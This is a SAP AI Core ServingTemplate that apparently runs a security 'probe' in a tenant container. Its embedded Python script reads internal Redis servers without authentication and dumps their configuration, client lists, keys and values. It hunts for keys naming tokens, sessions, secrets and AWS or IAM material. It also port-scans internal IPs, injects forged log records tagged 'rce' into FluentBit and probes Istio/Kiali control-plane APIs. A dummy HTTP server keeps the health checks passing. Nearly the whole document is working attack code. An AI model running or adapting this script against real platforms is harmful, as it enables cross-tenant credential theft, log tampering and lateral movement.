apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: impact-probe-v11
  labels:
    scenarios.ai.sap.com/id: "impact-probe-v11"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "impact-probe-v11"
    executables.ai.sap.com/name: "impact-probe-v11"
    executables.ai.sap.com/description: "Redis + FluentBit probe v11"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            cat > /tmp/probe.py << 'PYEOF'
            import socket, time, ssl, json
            import urllib.request, urllib.error

            def report(k, v):
                print(f"[P11] {k}: {str(v)[:8000]}", flush=True)

            def http_get(url, headers=None, timeout=8):
                try:
                    req = urllib.request.Request(url, headers=headers or {})
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                        return r.read().decode(errors="replace"), r.status, dict(r.headers)
                except urllib.error.HTTPError as e:
                    body = ""
                    try: body = e.read().decode(errors="replace")[:2000]
                    except: pass
                    return f"HTTP_{e.code}:{body}", e.code, {}
                except Exception as e:
                    return f"ERR:{type(e).__name__}:{e}", 0, {}

            # ── REDIS RAW CLIENT ──────────────────────────────────────────────────
            class Redis:
                def __init__(self, host, port=6379, timeout=6):
                    self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.s.settimeout(timeout)
                    self.s.connect((host, port))
                    self.buf = b""

                def send(self, *args):
                    cmd = f"*{len(args)}\r\n"
                    for a in args:
                        a = str(a)
                        cmd += f"${len(a)}\r\n{a}\r\n"
                    self.s.sendall(cmd.encode())

                def recv_line(self):
                    while b"\r\n" not in self.buf:
                        chunk = self.s.recv(4096)
                        if not chunk:
                            break
                        self.buf += chunk
                    line, _, self.buf = self.buf.partition(b"\r\n")
                    return line.decode(errors="replace")

                def read_response(self):
                    line = self.recv_line()
                    if not line:
                        return None
                    t = line[0]
                    data = line[1:]
                    if t == '+':   # simple string
                        return data
                    elif t == '-': # error
                        return f"ERR:{data}"
                    elif t == ':': # integer
                        return int(data)
                    elif t == '$': # bulk string
                        n = int(data)
                        if n == -1:
                            return None
                        result = b""
                        while len(result) < n + 2:
                            chunk = self.s.recv(n + 2 - len(result))
                            if not chunk:
                                break
                            result += chunk
                        self.buf = result[n+2:] + self.buf
                        return result[:n].decode(errors="replace")
                    elif t == '*': # array
                        count = int(data)
                        if count == -1:
                            return None
                        return [self.read_response() for _ in range(count)]
                    return line

                def cmd(self, *args):
                    self.send(*args)
                    return self.read_response()

                def close(self):
                    try: self.s.close()
                    except: pass

            # ── 1. CONNECT TO REDIS ───────────────────────────────────────────────
            REDIS_IPS = [
                "100.109.69.212",   # from Envoy listeners
            ]
            # Also check KSM for other Redis ClusterIPs — we'll scan the service CIDR
            # Additional candidates from Envoy listeners
            report("---", "=== 1. REDIS CONNECTION + UNAUTHENTICATED ACCESS ===")

            for redis_host in REDIS_IPS:
                report("REDIS_TARGET", f"{redis_host}:6379")
                try:
                    r = Redis(redis_host, 6379, timeout=8)

                    # PING
                    pong = r.cmd("PING")
                    report("REDIS_PING", pong)

                    # INFO — server version, config, replication
                    info = r.cmd("INFO", "all")
                    report("REDIS_INFO_ALL", info)

                    # CONFIG GET * — may expose requirepass, bind, etc.
                    cfg = r.cmd("CONFIG", "GET", "*")
                    report("REDIS_CONFIG_GET_ALL", str(cfg))

                    # CLIENT LIST — active connections (may reveal other services using Redis)
                    clients = r.cmd("CLIENT", "LIST")
                    report("REDIS_CLIENT_LIST", clients)

                    # DBSIZE per DB
                    for db in range(16):
                        r.cmd("SELECT", db)
                        size = r.cmd("DBSIZE")
                        if size and size > 0:
                            report(f"REDIS_DB{db}_SIZE", size)

                    # Back to DB 0
                    r.cmd("SELECT", "0")
                    size0 = r.cmd("DBSIZE")
                    report("REDIS_DB0_SIZE", size0)

                    # KEYS * — dump all keys (cap at 500)
                    keys = r.cmd("KEYS", "*")
                    report("REDIS_KEYS_ALL", keys)

                    if keys and isinstance(keys, list):
                        report("REDIS_KEY_COUNT", len(keys))
                        # Sample up to 50 keys with type + value
                        for key in keys[:50]:
                            try:
                                ktype = r.cmd("TYPE", key)
                                ttl   = r.cmd("TTL", key)
                                if ktype == "string":
                                    val = r.cmd("GET", key)
                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl} val={str(val)[:500]}")
                                elif ktype == "hash":
                                    val = r.cmd("HGETALL", key)
                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl} val={str(val)[:500]}")
                                elif ktype == "list":
                                    val = r.cmd("LRANGE", key, "0", "20")
                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl} val={str(val)[:500]}")
                                elif ktype == "set":
                                    val = r.cmd("SMEMBERS", key)
                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl} val={str(val)[:500]}")
                                elif ktype == "zset":
                                    val = r.cmd("ZRANGE", key, "0", "20", "WITHSCORES")
                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl} val={str(val)[:500]}")
                                else:
                                    report(f"REDIS_KEY_{key}", f"[{ktype}] ttl={ttl}")
                            except Exception as e:
                                report(f"REDIS_KEY_{key}_ERR", str(e))

                        # Scan all remaining keys for credential/token patterns
                        interesting = [k for k in keys if any(
                            x in k.lower() for x in [
                                "token", "session", "auth", "secret", "cred", "key",
                                "pass", "jwt", "oauth", "user", "tenant", "cert",
                                "aws", "s3", "iam", "role", "access"
                            ]
                        )]
                        report("REDIS_INTERESTING_KEYS", interesting)
                        for key in interesting[:30]:
                            try:
                                ktype = r.cmd("TYPE", key)
                                if ktype == "string":
                                    val = r.cmd("GET", key)
                                elif ktype == "hash":
                                    val = r.cmd("HGETALL", key)
                                else:
                                    val = r.cmd("LRANGE", key, "0", "-1") if ktype == "list" else "?"
                                report(f"REDIS_INTERESTING_{key}", f"[{ktype}] {str(val)[:1000]}")
                            except Exception as e:
                                report(f"REDIS_INTERESTING_{key}_ERR", str(e))

                    r.close()

                except ConnectionRefusedError:
                    report("REDIS_CONNECT", f"ECONNREFUSED — Istio blocks {redis_host}:6379")
                except socket.timeout:
                    report("REDIS_CONNECT", f"ETIMEDOUT — {redis_host}:6379")
                except OSError as e:
                    report("REDIS_CONNECT", f"OSError {e.errno}: {e}")
                except Exception as e:
                    import traceback
                    report("REDIS_ERR", f"{type(e).__name__}: {e}\n{traceback.format_exc()[:500]}")

            # ── 2. REDIS TLS (port 6380) ─────────────────────────────────────────
            report("---", "=== 2. REDIS TLS (port 6380) ===")
            for redis_host in REDIS_IPS:
                try:
                    raw = socket.create_connection((redis_host, 6380), timeout=5)
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    tls_sock = ctx.wrap_socket(raw, server_hostname=redis_host)
                    tls_sock.sendall(b"*1\r\n$4\r\nPING\r\n")
                    resp = tls_sock.recv(64).decode(errors="replace")
                    report(f"REDIS_TLS_{redis_host}:6380", f"CONNECTED: {resp}")
                    tls_sock.close()
                except Exception as e:
                    report(f"REDIS_TLS_{redis_host}:6380", f"{type(e).__name__}: {e}")

            # ── 3. SCAN SERVICE CIDR FOR MORE REDIS INSTANCES ─────────────────────
            report("---", "=== 3. SERVICE CIDR REDIS SCAN (100.104-111.x.x:6379) ===")
            # We know service CIDR is 100.104.0.0/x from Envoy listeners
            # Scan a targeted set of IPs we know from Envoy listeners
            candidate_ips = [
                "100.109.69.212",   # confirmed from Envoy
                "100.104.7.43",     # Kiali/control plane
                "100.106.186.136",  # unknown HTTP
                "100.109.200.238",  # port 8888
                "100.104.166.183",  # port 8042
            ]
            for ip in candidate_ips:
                for port in [6379, 6380, 6381]:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    try:
                        s.connect((ip, port))
                        s.sendall(b"*1\r\n$4\r\nPING\r\n")
                        data = s.recv(64).decode(errors="replace")
                        report(f"SCAN_{ip}:{port}", f"OPEN: {data[:100]}")
                        s.close()
                    except socket.timeout:
                        pass  # silent
                    except ConnectionRefusedError:
                        pass  # silent
                    except OSError as e:
                        if e.errno == 104:  # ECONNRESET = Istio RST
                            report(f"SCAN_{ip}:{port}", "ECONNRESET (Istio intercept)")
                    except Exception as e:
                        pass
                    finally:
                        try: s.close()
                        except: pass

            # ── 4. FLUENTBIT PORT 24224 ───────────────────────────────────────────
            report("---", "=== 4. FLUENTBIT FORWARD INPUT (port 24224) ===")
            # FluentBit forward protocol uses msgpack over TCP
            # Try raw TCP first to see what we get
            fb_targets = [
                ("100.64.76.16", 24224),
                ("100.64.33.11", 24224),
                ("100.109.242.36", 24224),
            ]
            for fb_host, fb_port in fb_targets:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                try:
                    s.connect((fb_host, fb_port))
                    report(f"FLUENTBIT_{fb_host}:{fb_port}_TCP", "CONNECTED")
                    # Send a Fluent Forward protocol message (msgpack)
                    # Tag: "security.probe", record: {"msg": "probe-v11", "tenant": "bb-12"}
                    # Fluent Forward format: [tag, [[timestamp, record]], option]
                    # Use raw msgpack bytes for a minimal message
                    import struct
                    # Minimal msgpack array [3 elements]:
                    # ["security.probe", [[ts, {"injected": "probe-v11"}]], {}]
                    tag = b"security.probe.rce"
                    ts  = int(time.time())
                    # Build msgpack manually (minimal)
                    def mp_str(s):
                        b = s.encode()
                        return bytes([0xa0 | len(b)]) + b if len(b) <= 31 else bytes([0xda, len(b)>>8, len(b)&0xff]) + b
                    def mp_int(n):
                        return struct.pack(">B", n) if n < 128 else struct.pack(">BH", 0xcd, n)
                    def mp_map(d):
                        r = bytes([0x80 | len(d)])
                        for k, v in d.items():
                            r += mp_str(k) + mp_str(v)
                        return r
                    entry = bytes([0x92]) + mp_int(ts) + mp_map({"injected": "sap-aicore-rce-probe-v11", "tenant": "bb-12"})
                    entries = bytes([0x91]) + entry
                    msg = bytes([0x93]) + mp_str(tag.decode()) + entries + bytes([0x80])
                    s.sendall(msg)
                    time.sleep(1)
                    try:
                        resp = s.recv(256)
                        report(f"FLUENTBIT_{fb_host}:{fb_port}_RESPONSE", resp.decode(errors="replace")[:200])
                    except socket.timeout:
                        report(f"FLUENTBIT_{fb_host}:{fb_port}_RESPONSE", "no response (accepted silently)")
                    s.close()
                except ConnectionRefusedError:
                    report(f"FLUENTBIT_{fb_host}:{fb_port}", "ECONNREFUSED (Istio blocks)")
                except OSError as e:
                    report(f"FLUENTBIT_{fb_host}:{fb_port}", f"OSError {e.errno}: {e}")
                except Exception as e:
                    report(f"FLUENTBIT_{fb_host}:{fb_port}_ERR", f"{type(e).__name__}: {e}")
                finally:
                    try: s.close()
                    except: pass

            # ── 5. UNKNOWN SERVICE 100.106.186.136:80 ────────────────────────────
            report("---", "=== 5. UNKNOWN HTTP SERVICE (100.106.186.136:80) ===")
            body, code, hdrs = http_get("http://100.106.186.136:80/", timeout=6)
            report("UNKNOWN_HTTP_ROOT", f"[{code}] hdrs={dict(list(hdrs.items())[:8])} {body[:500]}")
            for path in ["/metrics", "/health", "/api", "/api/v1", "/info", "/version",
                         "/swagger", "/openapi.json", "/.well-known/openid-configuration"]:
                body, code, hdrs = http_get(f"http://100.106.186.136:80{path}", timeout=5)
                if code not in (0,) and "ERR:timed" not in body and "ERR:Connection" not in body:
                    report(f"UNKNOWN_HTTP{path.replace('/','_')}", f"[{code}] {body[:400]}")

            # ── 6. PORT 20001/20004 (Istio/Kiali control plane) ─────────────────
            report("---", "=== 6. ISTIO CONTROL PLANE PORTS (100.104.7.43) ===")
            for port in [20001, 20004, 15010, 15014, 9090, 8080]:
                body, code, hdrs = http_get(f"http://100.104.7.43:{port}/", timeout=5)
                if code not in (0,) and "ERR:timed" not in body and "ERR:Connection" not in body:
                    report(f"KIALI_{port}_root", f"[{code}] {body[:400]}")
                    # If accessible, try Kiali API
                    if code == 200:
                        for kpath in ["/api/namespaces", "/api/config", "/api/istio/config/list",
                                      "/kiali/api/namespaces"]:
                            b2, c2, _ = http_get(f"http://100.104.7.43:{port}{kpath}", timeout=5)
                            if c2 not in (0,):
                                report(f"KIALI_{port}{kpath.replace('/','_')}", f"[{c2}] {b2[:400]}")

            report("DONE", "probe v11 complete")
            PYEOF
            python3 /tmp/probe.py 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self):
                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
          ports:
          - containerPort: 8080
            protocol: TCP
          readinessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 10
          livenessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 15
